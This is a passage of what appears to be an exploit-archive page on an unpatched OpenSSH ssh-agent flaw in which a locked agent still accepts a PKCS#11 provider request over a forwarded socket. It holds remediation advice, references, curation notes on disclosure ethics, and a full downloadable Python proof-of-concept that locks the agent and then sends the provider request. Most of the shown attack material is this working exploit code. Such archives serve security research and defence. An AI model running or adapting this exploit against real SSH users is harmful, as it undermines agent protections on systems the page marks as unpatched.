-prose-a:text-emerald-600 dark:prose-a:text-emerald-400
-prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
-prose-code:before:content-[''] prose-code:after:content-['']
-prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><div class="poc-code group/code my-4 overflow-hidden rounded border border-zinc-200 dark:border-mono-border"><div class="flex items-center justify-between border-b border-zinc-200 bg-zinc-50 px-3 py-1.5 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted"><span>Output</span>
-<button type=button class="code-copy transition hover:text-emerald-600 dark:hover:text-brand" aria-label="Copy code to clipboard">Copy</button></div><div class="poc-code-body overflow-x-auto bg-white dark:bg-[#05080a]"><pre class="px-3 py-2 font-mono text-[11px] leading-normal text-zinc-700 dark:text-slate-300"><code></code></pre></div></div></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=remediation class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 01-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 011-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17.0 011.52.0C14.51 3.81 17 5 19 5a1 1 0 011 1z"/><path d="m9 12 2 2 4-4"/></svg>
-Remediation</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
-prose-headings:font-mono prose-headings:tracking-tight
-prose-a:text-emerald-600 dark:prose-a:text-emerald-400
-prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
-prose-code:before:content-[''] prose-code:after:content-['']
-prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><div class=overflow-x-auto><table><thead><tr><th>Action</th><th>Detail</th></tr></thead><tbody><tr><td><strong>Patch</strong></td><td>None available at time of ingestion — no CVE or vendor advisory found for this specific finding.</td></tr><tr><td><strong>Workaround</strong></td><td>Avoid combining <code>ssh -A</code> (agent forwarding) with an unlocked-after-use workflow when connecting to untrusted or lower-trust hosts; consider <code>ssh -a</code> (no forwarding) or per-host <code>ForwardAgent no</code> for hosts that don&rsquo;t need it. Restrict the PKCS#11/security-key provider allowlist to the minimum necessary.</td></tr><tr><td><strong>Repair direction (per researcher)</strong></td><td>Process <code>session-bind@openssh.com</code> while the agent is locked so per-socket security state is recorded before any later unlock, rather than discarding the extension request entirely at the locked gate.</td></tr></tbody></table></div></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=references class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
-References</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
-prose-headings:font-mono prose-headings:tracking-tight
-prose-a:text-emerald-600 dark:prose-a:text-emerald-400
-prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
-prose-code:before:content-[''] prose-code:after:content-['']
-prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><ul><li><a href=https://github.com/bikini/exploitarium/tree/main/openssh-agent-lock-provider-bypass>Source repository — bikini/exploitarium</a></li><li><a href=https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-10.4p1.tar.gz>OpenSSH portable 10.4p1 source archive</a></li><li><a href=https://www.openbsd.org/openssh/agent-restrict.html>OpenSSH agent restriction design</a></li><li><a href=https://man.openbsd.org/ssh-agent.1>ssh-agent manual</a></li></ul></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=notes class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15.5 3H5A2 2 0 003 5v14a2 2 0 002 2h14a2 2 0 002-2V8.5z"/><path d="M15 3v6h6"/></svg>
-Notes</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
-prose-headings:font-mono prose-headings:tracking-tight
-prose-a:text-emerald-600 dark:prose-a:text-emerald-400
-prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
-prose-code:before:content-[''] prose-code:after:content-['']
-prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><p>Surfaced by checking <a href=https://github.com/bikini/exploitarium>bikini/exploitarium</a> directly at the user&rsquo;s request for newest entries not yet in this archive — the rest of that repository&rsquo;s contents (37 of 39 research folders) were already covered by an earlier 2026-07-03 ingestion sweep from the same source. This was the newer of the two genuinely new entries found (both dated 2026-07-11); the other, a Firefox 152.0.5 drive-by remote-code-execution chain, was deliberately <strong>not</strong> ingested — see the companion decision recorded in this session: unlike this OpenSSH finding (which requires an already-established, agent-forwarded connection to an attacker-influenced host) and unlike every other no-CVE entry already in this archive (which had defined vendor-disclosure timelines before publication), that Firefox chain is a fully working, unpatched, single-URL-visit RCE against current stock Firefox with no evidence of vendor coordination — archiving it would mean amplifying a live weapon against currently-unpatched users rather than documenting research about a resolved issue.</p><p>No CVE has been assigned to this finding as of ingestion. The repository&rsquo;s own README states research is published without prior vendor notification (&ldquo;At the time I post these, none have been reported&rdquo;), which is a real disclosure-ethics concern worth being aware of for this source generally — but this specific finding&rsquo;s narrower exploitability (requires an existing agent-forwarded SSH session to an attacker-influenced host, not a passive/drive-by vector) keeps it in line with the archive&rsquo;s existing risk bar, unlike the Firefox chain.</p></div></section><div class="overflow-hidden rounded-lg border border-zinc-300 shadow-lg dark:border-mono-border"><div class="flex items-center gap-3 bg-zinc-800 px-3 py-2"><div class="flex shrink-0 items-center gap-1.5"><span class="h-3 w-3 rounded-full bg-red-500"></span>
-<span class="h-3 w-3 rounded-full bg-yellow-400"></span>
-<span class="h-3 w-3 rounded-full bg-green-500"></span></div><div class="flex flex-1 justify-center"><div class="flex items-center gap-1.5 rounded-t border-x border-t border-zinc-700 bg-zinc-950 px-3 py-1"><span class="h-2.5 w-2.5 shrink-0 rounded-sm" style=background-color:#3b82f6></span>
-<span class="font-mono text-xs text-zinc-200">poc.py</span></div></div><div class="flex shrink-0 items-center gap-2"><span class="rounded border border-zinc-600 bg-zinc-700/40 px-1.5 py-0.5 font-mono text-[10px] uppercase tracking-wide text-zinc-400">python</span>
-<a href=https://raw.githubusercontent.com/intelseclab/poc-archive/master/pocs/network/2026-07-12_openssh-agent-lock-provider-bypass/poc.py target=_blank rel=noopener class="font-mono text-xs text-zinc-400 hover:text-zinc-200 transition">raw</a>
-<a href=https://github.com/intelseclab/poc-archive/blob/master/pocs/network/2026-07-12_openssh-agent-lock-provider-bypass/poc.py target=_blank rel=noopener class="font-mono text-xs text-zinc-400 hover:text-zinc-200 transition">GitHub</a>
-<a href=https://raw.githubusercontent.com/intelseclab/poc-archive/master/pocs/network/2026-07-12_openssh-agent-lock-provider-bypass/poc.py download=poc.py class="rounded bg-emerald-600 px-2.5 py-1 font-mono text-xs font-medium text-white transition hover:bg-emerald-500">↓ Download</a></div></div><div class="poc-viewer overflow-x-auto"><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
-</span><span class=lnt> 2
-</span><span class=lnt> 3
-</span><span class=lnt> 4
-</span><span class=lnt> 5
-</span><span class=lnt> 6
-</span><span class=lnt> 7
-</span><span class=lnt> 8
-</span><span class=lnt> 9
-</span><span class=lnt>10
-</span><span class=lnt>11
-</span><span class=lnt>12
-</span><span class=lnt>13
-</span><span class=lnt>14
-</span><span class=lnt>15
-</span><span class=lnt>16
-</span><span class=lnt>17
-</span><span class=lnt>18
-</span><span class=lnt>19
-</span><span class=lnt>20
-</span><span class=lnt>21
-</span><span class=lnt>22
-</span><span class=lnt>23
-</span><span class=lnt>24
-</span><span class=lnt>25
-</span><span class=lnt>26
-</span><span class=lnt>27
-</span><span class=lnt>28
-</span><span class=lnt>29
-</span><span class=lnt>30
-</span><span class=lnt>31
-</span><span class=lnt>32
-</span><span class=lnt>33
-</span><span class=lnt>34
-</span><span class=lnt>35
-</span><span class=lnt>36
-</span><span class=lnt>37
-</span><span class=lnt>38
-</span><span class=lnt>39
-</span><span class=lnt>40
-</span><span class=lnt>41
-</span><span class=lnt>42
-</span><span class=lnt>43
-</span><span class=lnt>44
-</span><span class=lnt>45
-</span><span class=lnt>46
-</span><span class=lnt>47
-</span><span class=lnt>48
-</span><span class=lnt>49
-</span><span class=lnt>50
-</span><span class=lnt>51
-</span><span class=lnt>52
-</span><span class=lnt>53
-</span><span class=lnt>54
-</span><span class=lnt>55
-</span><span class=lnt>56
-</span><span class=lnt>57
-</span><span class=lnt>58
-</span><span class=lnt>59
-</span><span class=lnt>60
-</span><span class=lnt>61
-</span><span class=lnt>62
-</span><span class=lnt>63
-</span><span class=lnt>64
-</span><span class=lnt>65
-</span><span class=lnt>66
-</span><span class=lnt>67
-</span><span class=lnt>68
-</span><span class=lnt>69
-</span><span class=lnt>70
-</span><span class=lnt>71
-</span><span class=lnt>72
-</span><span class=lnt>73
-</span><span class=lnt>74
-</span><span class=lnt>75
-</span><span class=lnt>76
-</span><span class=lnt>77
-</span><span class=lnt>78
-</span><span class=lnt>79
-</span><span class=lnt>80
-</span><span class=lnt>81
-</span><span class=lnt>82
-</span><span class=lnt>83
-</span><span class=lnt>84
-</span><span class=lnt>85
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>argparse</span>
-</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
-</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
-</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
-</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=n>LOCK</span> <span class=o>=</span> <span class=mi>22</span>
-</span></span><span class=line><span class=cl><span class=n>UNLOCK</span> <span class=o>=</span> <span class=mi>23</span>
-</span></span><span class=line><span class=cl><span class=n>ADD_SMARTCARD_KEY</span> <span class=o>=</span> <span class=mi>20</span>
-</span></span><span class=line><span class=cl><span class=n>SUCCESS</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x06</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ssh_string</span><span class=p>(</span><span class=n>value</span><span class=p>):</span>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&gt;I&#34;</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>value</span><span class=p>))</span> <span class=o>+</span> <span class=n>value</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>recv_exact</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=n>length</span><span class=p>):</span>
-</span></span><span class=line><span class=cl>    <span class=n>chunks</span> <span class=o>=</span> <span class=p>[]</span>
-</span></span><span class=line><span class=cl>    <span class=n>remaining</span> <span class=o>=</span> <span class=n>length</span>
-</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>remaining</span><span class=p>:</span>
-</span></span><span class=line><span class=cl>        <span class=n>chunk</span> <span class=o>=</span> <span class=n>sock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>remaining</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>chunk</span><span class=p>:</span>
-</span></span><span class=line><span class=cl>            <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=s2>&#34;agent closed the connection&#34;</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>        <span class=n>chunks</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>chunk</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>        <span class=n>remaining</span> <span class=o>-=</span> <span class=nb>len</span><span class=p>(</span><span class=n>chunk</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>chunks</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>request</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=n>body</span><span class=p>):</span>
-</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&gt;I&#34;</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>body</span><span class=p>))</span> <span class=o>+</span> <span class=n>body</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=n>length</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s2>&#34;&gt;I&#34;</span><span class=p>,</span> <span class=n>recv_exact</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=mi>4</span><span class=p>))[</span><span class=mi>0</span><span class=p>]</span>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>recv_exact</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=n>length</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>connect</span><span class=p>(</span><span class=n>path</span><span class=p>):</span>
-</span></span><span class=line><span class=cl>    <span class=n>sock</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_UNIX</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>connect</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>sock</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>control</span><span class=p>(</span><span class=n>args</span><span class=p>):</span>
-</span></span><span class=line><span class=cl>    <span class=n>request_type</span> <span class=o>=</span> <span class=n>LOCK</span> <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>action</span> <span class=o>==</span> <span class=s2>&#34;lock&#34;</span> <span class=k>else</span> <span class=n>UNLOCK</span>
-</span></span><span class=line><span class=cl>    <span class=n>body</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>request_type</span><span class=p>])</span> <span class=o>+</span> <span class=n>ssh_string</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>password</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
-</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>connect</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>socket</span><span class=p>)</span> <span class=k>as</span> <span class=n>sock</span><span class=p>:</span>
-</span></span><span class=line><span class=cl>        <span class=n>reply</span> <span class=o>=</span> <span class=n>request</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=n>body</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=n>value</span> <span class=o>=</span> <span class=n>reply</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=k>if</span> <span class=n>reply</span> <span class=k>else</span> <span class=o>-</span><span class=mi>1</span>
-</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>args</span><span class=o>.</span><span class=n>action</span><span class=si>}</span><span class=s2>_reply_type=</span><span class=si>{</span><span class=n>value</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>flush</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span> <span class=k>if</span> <span class=n>reply</span> <span class=o>==</span> <span class=n>SUCCESS</span> <span class=k>else</span> <span class=mi>1</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>probe</span><span class=p>(</span><span class=n>args</span><span class=p>):</span>
-</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>connect</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=p>[</span><span class=s2>&#34;SSH_AUTH_SOCK&#34;</span><span class=p>])</span> <span class=k>as</span> <span class=n>sock</span><span class=p>:</span>
-</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;forwarded_socket_connected=true&#34;</span><span class=p>,</span> <span class=n>flush</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>hold</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>        <span class=n>body</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>ADD_SMARTCARD_KEY</span><span class=p>])</span>
-</span></span><span class=line><span class=cl>        <span class=n>body</span> <span class=o>+=</span> <span class=n>ssh_string</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>provider</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
-</span></span><span class=line><span class=cl>        <span class=n>body</span> <span class=o>+=</span> <span class=n>ssh_string</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>        <span class=n>reply</span> <span class=o>=</span> <span class=n>request</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=n>body</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=n>value</span> <span class=o>=</span> <span class=n>reply</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=k>if</span> <span class=n>reply</span> <span class=k>else</span> <span class=o>-</span><span class=mi>1</span>
-</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;provider_reply_type=</span><span class=si>{</span><span class=n>value</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>flush</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
-</span></span><span class=line><span class=cl>    <span class=n>parser</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>()</span>
-</span></span><span class=line><span class=cl>    <span class=n>commands</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>add_subparsers</span><span class=p>(</span><span class=n>dest</span><span class=o>=</span><span class=s2>&#34;command&#34;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=n>control_parser</span> <span class=o>=</span> <span class=n>commands</span><span class=o>.</span><span class=n>add_parser</span><span class=p>(</span><span class=s2>&#34;control&#34;</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=n>control_parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;action&#34;</span><span class=p>,</span> <span class=n>choices</span><span class=o>=</span><span class=p>(</span><span class=s2>&#34;lock&#34;</span><span class=p>,</span> <span class=s2>&#34;unlock&#34;</span><span class=p>))</span>
-</span></span><span class=line><span class=cl>    <span class=n>control_parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--socket&#34;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=n>control_parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--password&#34;</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=s2>&#34;agent-lock-proof&#34;</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=n>control_parser</span><span class=o>.</span><span class=n>set_defaults</span><span class=p>(</span><span class=n>handler</span><span class=o>=</span><span class=n>control</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=n>probe_parser</span> <span class=o>=</span> <span class=n>commands</span><span class=o>.</span><span class=n>add_parser</span><span class=p>(</span><span class=s2>&#34;probe&#34;</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=n>probe_parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--provider&#34;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=n>probe_parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--hold&#34;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>float</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=mf>3.0</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=n>probe_parser</span><span class=o>.</span><span class=n>set_defaults</span><span class=p>(</span><span class=n>handler</span><span class=o>=</span><span class=n>probe</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>args</span><span class=o>.</span><span class=n>handler</span><span class=p>(</span><span class=n>args</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
-</span></span><span class=line><span class=cl>    <span class=k>raise</span> <span class=ne>SystemExit</span><span class=p>(</span><span class=n>main</span><span class=p>())</span>
-</span></span></code></pre></td></tr></table></div></div></div></div><nav class="grid grid-cols-1 gap-3 pt-2 sm:grid-cols-2"><a href=/pocs/network/2026-07-11_cve-2022-26258-dlink-dir820l-command-injection/ class="group rounded-lg border border-zinc-200 p-3 transition hover:border-emerald-400 dark:border-mono-border dark:bg-mono-card dark:hover:border-brand"><span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400 dark:text-mono-muted">← previous in network</span>
-<span class="mt-1 block truncate font-mono text-xs text-zinc-700 group-hover:text-emerald-600 dark:text-slate-300 dark:group-hover:text-brand">D-Link DIR-820L `get_set.ccp` LAN Configuration OS Command Injection (CVE-2022-26258)</span>
-</a><a href=/pocs/network/2026-07-15_cve-2026-15409-sonicwall-sma1000-ssrf-erlang-rce/ class="group rounded-lg border border-zinc-200 p-3 text-right transition hover:border-emerald-400 dark:border-mono-border dark:bg-mono-card dark:hover:border-brand"><span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400 dark:text-mono-muted">next in network →</span>
-<span class="mt-1 block truncate font-mono text-xs text-zinc-700 group-hover:text-emerald-600 dark:text-slate-300 dark:group-hover:text-brand">SonicWall SMA1000 WorkPlace SSRF → Internal Erlang RPC Remote Code Execution (CVE-2026-15409)</span></a></nav></div><aside class="hidden lg:block"><div class="sticky top-20 space-y-4"><nav class="rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><p class="mb-2 border-b border-zinc-200 pb-2 font-mono text-xs font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white">On this page</p><div class="toc text-sm leading-relaxed"><nav id=TableOfContents><ul><li><a href=#metadata>Metadata</a></li><li><a href=#affected-target>Affected Target</a></li><li><a href=#summary>Summary</a></li><li><a href=#vulnerability-details>Vulnerability Details</a><ul><li><a href=#root-cause>Root Cause</a></li><li><a href=#attack-vector>Attack Vector</a></li><li><a href=#impact>Impact</a></li></ul></li><li><a href=#environment--lab-setup>Environment / Lab Setup</a><ul><li><a href=#setup-steps>Setup Steps</a></li></ul></li><li><a href=#proof-of-concept>Proof of Concept</a><ul><li><a href=#step-by-step-reproduction>Step-by-Step Reproduction</a></li><li><a href=#exploit-code>Exploit Code</a></li><li><a href=#expected-output>Expected Output</a></li></ul></li><li><a href=#detection--indicators-of-compromise>Detection & Indicators of Compromise</a></li><li><a href=#remediation>Remediation</a></li><li><a href=#references>References</a></li><li><a href=#notes>Notes</a></li></ul></nav></div></nav><div class="space-y-5 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><dl class="space-y-3 font-mono text-xs"><div><dt class="text-zinc-500 dark:text-zinc-400">Severity</dt><dd class=mt-1><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-orange-500/40 bg-orange-500/10 text-orange-500 dark:text-orange-400"><span class="h-1.5 w-1.5 rounded-full bg-current"></span>High</span></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Category</dt><dd class=mt-1><a href=/pocs/network/ class="text-zinc-700 hover:text-emerald-600 dark:text-zinc-300 dark:hover:text-emerald-400">network</a></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected product</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">OpenSSH portable — ssh, sshd, ssh-agent</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected versions</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">Portable tags V_9_3_P2 through V_10_4_P1 (provider restriction logic present since 9.3p2; failed-session-bind tracking added in 9.6p1, still reachable behind the locked gate through 10.4p1)</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Disclosed</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">2026-07-12</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Patch status</dt><dd class=mt-1><span class="text-red-500 dark:text-red-400" title="No vendor fix at the time of writing">Unpatched</span></dd></div></dl><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Tags</p><div class="mt-2 flex flex-wrap gap-1.5"><a href=/tags/openssh/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#openssh</a>
-<a href=/tags/ssh-agent/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#ssh-agent</a>
-<a href=/tags/agent-forwarding/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#agent-forwarding</a>
-<a href=/tags/pkcs11/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#pkcs11</a>
-<a href=/tags/race-condition/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#race-condition</a>
-<a href=/tags/state-confusion/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#state-confusion</a>
